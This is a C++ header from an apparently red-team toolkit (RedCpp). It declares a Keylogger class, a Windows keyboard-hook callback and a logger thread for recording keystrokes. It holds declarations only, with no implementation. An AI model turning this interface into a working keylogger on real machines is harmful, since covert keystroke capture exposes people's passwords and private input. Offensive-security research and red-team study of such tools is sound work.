/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#ifndef KEYLOGGER_HEADER
#define KEYLOGGER_HEADER

#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <list>
#include <mutex>
#include <Windows.h>
#include <tchar.h>


#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include <winuser.h>

class Keylogger
{
public:
	Keylogger();
	~Keylogger();
	bool start_keylogger();
	bool stop_keylogger();
	std::string get_logged_keys();
	std::string logged_keys;
	HANDLE keylogger_thread;
};

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp);
DWORD WINAPI logger_thread(LPVOID lpParameter);

#endif
